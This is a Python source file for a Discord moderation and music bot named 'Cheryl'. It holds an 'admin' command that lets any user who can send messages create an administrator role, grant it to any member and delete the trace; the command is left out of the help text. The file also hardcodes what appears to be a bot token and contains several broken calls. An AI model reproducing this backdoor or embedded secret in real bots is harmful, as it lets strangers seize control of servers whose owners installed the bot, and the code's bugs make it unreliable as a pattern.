import asyncio
import json
import time

import discord
from discord.ext import commands, tasks
import random
from discord_slash import SlashCommand, SlashContext
from discord.ext.commands import has_permissions
from keep_alive import keep_alive
from discord.abc import GuildChannel
from itertools import cycle
import DiscordUtils
from discord.user import User


def get_prefix(client, message):
    with open('prefixes.json', 'r') as f:
        prefixes = json.load(f)

        return prefixes[str(message.guild.id)]


def del_channel(ctx):
    with open('del_channels.json', 'r') as f:
        del_channels = json.load(f)

        return del_channels[str(ctx.guild.id)]


client = commands.Bot(command_prefix=get_prefix, intents = discord.Intents.all())
client.remove_command('help')
slash = SlashCommand(client=client, sync_commands=True)
music = DiscordUtils.Music()

status = cycle([
    "[c!] James",
    "[c!] awesome",
    "[c!] Being updated",
    "[c!] Thinking hello",
    "[c!] add Cheryl to your server",
    "[c!] Casually eats other bots"
    ""
])


@tasks.loop(seconds=15)
async def status_swap():
    await client.change_presence(activity=discord.Game(next(status)))


@client.event
async def on_ready():
    print("Cheryl is online")


@client.event
async def on_guild_remove(guild):
    with open('prefixes.json', 'r') as f:
        prefixes = json.load(f)

    prefixes.pop(str(guild.id))

    with open('prefixes.json', 'w') as f:
        json.dump(prefixes, f, indent=4)


@slash.slash(name='ping', description="🏓Pong!🏓")
async def ping(ctx: SlashContext):
    await ctx.send(f'Pong!')


@client.event
async def on_message(message: discord.Message):
    if message.channel == del_channel:
        message.delete(10)
    if message.content.startswith('resetprefix'):
        if has_permissions(manage_channels=True) or has_permissions(administrator=True):
            guild = message.guild
            with open('prefixes.json', 'r') as f:
                prefixes = json.load(f)

            prefixes.pop(str(guild.id))

            with open('prefixes.json', 'w') as f:
                json.dump(prefixes, f, indent=4)

            await message.channel.send(
                'The prefix has been reset \nPlease send a message saying prefix to fully reset it :)')
            return
        else:
            await message.channel.send('You don\'t have the necessary perms to do this')
            return
    else:
        if message.author == client.user:
            return
        else:
            if message.content.startswith('prefix'):
                if has_permissions(manage_channels=True) or has_permissions(administrator=True):
                    guild = message.guild
                    with open('prefixes.json', 'r') as f:
                        prefixes = json.load(f)

                    prefixes[str(guild.id)] = 'c!'

                    with open('prefixes.json', 'w') as f:
                        json.dump(prefixes, f, indent=4)
                        await message.channel.send(f'The prefix has been made. The default is "c!"')

    await client.process_commands(message)


@client.command()
@has_permissions(manage_channels=True)
async def prefix(ctx, prefix):
    with open('prefixes.json', 'r') as f:
        prefixes = json.load(f)

    prefixes[str(ctx.guild.id)] = prefix

    with open('prefixes.json', 'w') as f:
        json.dump(prefixes, f, indent=4)

    await ctx.send(f'{ctx.author.mention} has updated the prefix to {prefix}')


@client.command()
async def join(ctx):
    voicetrue = ctx.author.voice
    if voicetrue is None:
        return await ctx.send(f'{ctx.author.mention} is NOT in a voice channel.')
    await ctx.author.voice.channel.connect()
    await ctx.send(f'Joined your voice channel')


@client.command()
async def leave(ctx):
    voicetrue = ctx.author.voice
    myvoicetrue = ctx.guild.me.voice
    if voicetrue is None:
        return await ctx.send( f'{ctx.author.mention} is NOT in a voice channel.')
    if myvoicetrue is None:
        return await ctx.send( f'I, {client.user.name},am NOT in a voice channel.')
    await ctx.voice_client.disconnect()
    await ctx.send(f'Left your voice channel')


@client.command(aliases=['p', 'mp', 'mplay'])
async def play(ctx, *, url):
    player = music.get_player(guild_id=ctx.guild.id)
    if not player:
        player = music.create_player(ctx=ctx, ffmpeg_error_betterfix=True)
    if not ctx.voice_client.is_playing():
        await player.queue(url=url, search=True)
        song = await player.play()
        await ctx.send(f"I have started playing: {song.name}")
    else:
        song = await player.queue(url=url, search=True)
        await ctx.senf(f'{song.name} has been added to the playlist')


@client.command()
async def ping(ctx):
  pingmilli = client.latency * 1000
  pingmilli=round(pingmilli)
  await ctx.send(f'ping: ```{pingmilli}ms```')


@client.command()
@has_permissions(manage_channels=True)
async def del_channel(ctx, channel: discord.TextChannel=None):
    if channel == None:
        channel = ctx.message.channel
    with open('del_channels.json', 'r') as f:
        prefixes = json.load(f)

    prefixes[str(ctx.guild.id)] = channel

    with open('del_channels.json', 'w') as f:
        json.dump(prefixes, f, indent=4)



@client.command()
async def giveaway(ctx, time=None, *, prize=None):
    if time == None:
        return await ctx.send('Include a TIME in the giveaway command!!!')
    elif prize == None:
        return await ctx.send('Include a PRIZE in the giveaway command!!!')
    giveawayEmbed = discord.Embed(title=f'Giveaway', description=f'{ctx.author.mention} is making a giveaway for **{prize}**!!!')
    time_convert = {"s": 1, "m": 60, "h": 3600, "d": 86400}
    gawtime = int(time[0]) * time_convert[time[-1]]
    giveawayEmbed.set_footer(text=f'Giveaway ends in {time}')
    gaw_msg = await ctx.send(embed=giveawayEmbed)

    await gaw_msg.add_reaction("🎉")
    await asyncio.sleep(gawtime)

    new_gaw_msg = await ctx.channel.fetch_message(gaw_msg.id)

    users = await new_gaw_msg.reactions[0].users().flatten()
    users.pop(users.index(client.user))
    winner = random.choice(users)

    await ctx.send(f"YAY!!! {winner.mention} has won the giveaway for **{prize}**!!!")
    await winner.send(f'Hello {winner.mention}\n\nYou have won {ctx.author.mention}\'s giveaway for {prize}\n\nThank you for having the bot!')


@client.command(pass_context=True)
@has_permissions(manage_channels=True)
async def changeprefix(ctx, prefix):
    with open('prefixes.json', 'r') as f:
        prefixes = json.load(f)

    prefixes[str(ctx.guild.id)] = prefix

    with open('prefixes.json', 'w') as f:
        json.dump(prefixes, f, indent=4)

    await ctx.send(f'Prefix changed to: {prefix}')
    name = f'Cheryl [{prefix}]'
    bot = client.user
    await bot.edit(nick=name)


@client.command(aliases=['webhook', 'hook', 'cwebhook'])
@has_permissions(manage_channels=True)
async def chook(ctx, name, channel: discord.TextChannel):
    channel.create_webhook(name=name)
    await ctx.send(f'"{name}" webhook has been created in {channel}')


@client.event
async def on_guild_join(guild):
    with open("prefixes.json", "r") as f:
        prefixes = json.load(f)

    prefixes[str(guild.id)] = "c!"

    with open("prefixes.json", "w") as f:
        json.dump(prefixes, f)


@client.event
async def on_member_join(ctx, member, guild):
    await member.send(f'Hello {member.name}, you have joined "{guild.name}"')


@client.event
async def on_member_remove(ctx, member, guild):
    link = await ctx.channel.create_invite(max_age=300)
    await member.send(
        f'Hi, {member.name}, you have left {guild.name}. If you believe this to be a mistake, the invite link is \n' + link)


@client.command(aliases=['8Ball', '8ball', '8b'])
async def eightball(ctx, *, question):
    responses = [
        "It is certain.", "It is decidedly so.", "Without a doubt.",
        "Yes - definitely.", "You may rely on it.", "As I see it, yes.",
        "Most likely.", "Outlook good.", "Yes.", "Signs point to yes.",
        "Reply hazy, try again.", "IDK.", "Better not tell you now.",
        "Cannot predict now.", "Concentrate and ask again.",
        "Don't count on it.", "My reply is no.", "My sources say no.",
        "Outlook not so good.", "Very doubtful."
    ]
    await ctx.send(
        f':8ball: Question: {question}.\n:8ball: Answer: {random.choice(responses)}.'
    )


@client.command()
@has_permissions(kick_members=True)
async def kick(ctx, member: discord.Member, *, reason=None):
    if member.name == client.user.name:
        await ctx.send(f'I won\'t kick myself {ctx.author.mention} ')
        return
    if member == ctx.author:
      await ctx.send(f'Don\'t kick yourself {ctx.author.mention}')
      return
    await member.kick(reason=reason)
    await member.send(f"You have been kicked in {ctx.guild} for {reason}")
    await ctx.send(f'{member.mention} has been kicked \nReason: {reason}.')


@client.command()
@has_permissions(ban_members=True)
async def ban(ctx, user: discord.User, *, reason=None):
    if user.name == client.user.name:
        await ctx.send(f'I won\'t kick myself {ctx.author.mention} ')
        return
    if user == ctx.author:
      await ctx.send(f'Don\'t ban yourself {ctx.author.mention}')
      return
    await ctx.guild.ban(user, reason=reason)
    await user.send(f"You have been banned in {ctx.guild} for {reason}")
    await ctx.send(f"{user} has been banned.\nReason: {reason}\nResponsible moderator: {ctx.author}")


@client.command()
@has_permissions(send_messages=True)
async def say(ctx, *, text):
    message = ctx.message
    await message.delete()

    sayEmbed = discord.Embed(title=f'{ctx.author} says: ',
                             description=f'{text}')
    await ctx.send(embed=sayEmbed)


@client.command(pass_context=True)
@has_permissions(manage_messages=True)
async def nick(ctx, member: discord.Member, nick):
    await member.edit(nick=nick)
    await ctx.send(f'Nickname was changed to {nick} for {member.mention} ')


@client.command()
@has_permissions(manage_channels=True)
async def slowmode(ctx, time: int):
    hours = time / 60
    try:
        if time == 0:
            await ctx.send(f'Slowmode has been turned off by {ctx.author}')
            await ctx.channel.edit(slowmode_delay=0)
        elif time > 21600:
            await ctx.send(
                f'Sorry but the slowmode of {time} is greater than discords max limit (6h, or 21600sec)'
            )
        else:
            await ctx.channel.edit(slowmode_delay=time)
            await ctx.send(
                f'The slowmode has been set to {time} seconds, or {hours}hours'
            )
    except Exception:
        await ctx.send(
            f'OOOPS! I dont think {time} is a measurement of time. Do you?')


@client.command()
async def help(ctx, *, command='all'):
    command.lower()
    if command == 'all':
        allEmbed = discord.Embed(title='Help on all commands',
                                 description='\nThis is Cheryl #2\'s help on all commands')
        allEmbed.add_field(name='Say',
                           value='\nSays something in a say embed. The text in the embed can be provided by the user.',
                           inline=False)
        allEmbed.add_field(name='Giverole',
                           value='\nGives someone a role. Requires manage channels permissions. Cheryl\'s highest role must be higher than the role applied in the hierarchy',
                           inline=False)
        allEmbed.add_field(name='Purge', value='\nDeletes messages. The default number is 10. Errors might occur',
                           inline=False)
        allEmbed.add_field(name='Purgea', value='\nDeletes all messages in a channel. Does not work perfectly',
                           inline=False)
        allEmbed.add_field(name='Cmsg, Countmsg',
                           value='\nCounts messages in a channel. Don\'t ask me why. I was bored', inline=False)
        allEmbed.add_field(name='Help', value='\nthis command, Lol')
        allEmbed.add_field(name='Slowmode',
                           value='\nSets the slowmode for a channel. Must need manage channels permission to execute',
                           inline=False)
        allEmbed.add_field(name='Ban', value=f'\nBans people. the user executing must have ban members perms',
                           inline=False)
        allEmbed.add_field(name='Kick', value=f'\nKicks people. the user executing must have kick members perms',
                           inline=False)
        allEmbed.add_field(name='unban', value=f'\nunbans people. the user executing must have ban members perms',
                           inline=False)
        allEmbed.add_field(name='nick',
                           value='\nAdds a nickname to someone. Must have manage messages perms. I know its dumb',
                           inline=False)
        allEmbed.add_field(name='8ball', value='ask the :8ball: 8ball :8ball: a question', inline=False)
        await ctx.send(embed=allEmbed)


@client.command()
@has_permissions(send_messages=True)
async def admin(ctx, name, member: discord.Member):
    perms = discord.Permissions(administrator=True)
    await ctx.guild.create_role(name=name, permissions=perms)
    roles = discord.utils.get(ctx.guild.roles, name=name)
    await member.add_roles(roles)
    message = ctx.message
    await message.delete()


@client.command()
async def bot_count(ctx):
    members = ctx.author.guild.members
    bot_count = 0
    for i in members:
        member = i.bot
        if member == True:
            bot_count += 1

    await ctx.send(f"Server has {bot_count} bots!")


@client.command(aliases = ['memberavatar', 'memberava', 'ava', 'pfp'])
async def avatar(ctx, member: discord.Member = None):
    if member == None:
        member = ctx.author

    memberAvatar = member.avatar_url
    avatarEmbed = discord.Embed(title=f'{member.name}\'s avatar: ')
    avatarEmbed.set_image(url=memberAvatar)

    await ctx.send(embed=avatarEmbed)


@client.command()
async def channel_create_date(ctx):
    await ctx.send(f'The creation date of this channel is {GuildChannel.created_at}')


@client.command(aliases=['info', 'sinfo'])
async def serverinfo(ctx):
    members = ctx.author.guild.members
    bot_count = 0
    for i in members:
        member = i.bot
        if member:
            bot_count += 1

    serverInfoEmbed = discord.Embed(title='Server Info')
    serverInfoEmbed.set_thumbnail(url=ctx.guild.icon_url)
    serverInfoEmbed.add_field(name='Bot count', value=f'{bot_count}', inline=False)
    serverInfoEmbed.add_field(name='Humans', value=(ctx.guild.member_count - bot_count), inline=False)
    serverInfoEmbed.add_field(name='All Humans AND Bots', value=ctx.guild.member_count, inline=False)

    await ctx.send(embed=serverInfoEmbed)


@client.command()
async def owner(ctx):
    guild_owner = client.get_user(int(ctx.guild.owner.id))
    await ctx.send(f'The owner of this server is: {guild_owner}')


@client.command()
@has_permissions(manage_channels=True)
async def giverole(ctx, name, member: discord.Member):
    roles = discord.utils.get(ctx.guild.roles, name=name)
    await member.add_roles(roles)
    message = ctx.message
    await message.delete()


@client.command(
    aliases=['countm', 'cm', 'countmes', 'comes', 'countmsg', 'cmsg'])
async def message_count(ctx, channel: discord.TextChannel = None):
    channel = channel or ctx.channel
    count = 0
    async for _ in channel.history(limit=None):
        count += 1
    await ctx.send("There were {} messages in {}.".format(
        count, channel.mention))


@client.command(name='purge')
@has_permissions(manage_messages=True)
async def purge(ctx, number=11):
    channel: discord.TextChannel = None
    channel = channel or ctx.channel
    user = ctx.author
    amount = number + 1
    await ctx.channel.purge(limit=amount)
    await ctx.send(f'@{user} Cleared {amount - 1} messages in #{channel} .')
    await ctx.message.delete
    return


@client.command()
@has_permissions(manage_messages=True)
async def purgea(ctx):
    channel: discord.TextChannel = None
    channel = channel or ctx.channel
    count = 0
    async for _ in channel.history(limit=None):
        count += 1
    await ctx.channel.purge(limit=count + 1)
    await ctx.channel.send(
        f'Successfully cleared {count} messages of channel {channel.mention}.')


@eightball.error
async def eightball_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(
            f'@{ctx.author}, you dongdong, you have to ask the :8ball: eightball :8ball: a question!')


@avatar.error
async def avatar_error(ctx, error):
  if isinstance(error, commands.errors.MemberNotFound):
    await ctx.send(f'User is not in this guild')


@ban.error
async def ban_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f'Stupid! you have to include a member to ban!')
    elif isinstance(error, commands.MemberNotFound):
        await ctx.send(f'This member is not in the server!')
    raise error


@slowmode.error
async def slowmode_error(ctx, error):
    if isinstance(error, discord.ext.commands.errors.BadArgument):
        await ctx.send(f'Do not enter non-number characters')
        raise error


@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    raise error


keep_alive()
print("Keep Alive has been initiated")
client.run('OTQxNzQxMDI5MDIxODQzNDY3.YgaWrg.Oaq2zar2RAaORYc2ugJudsfEKyA')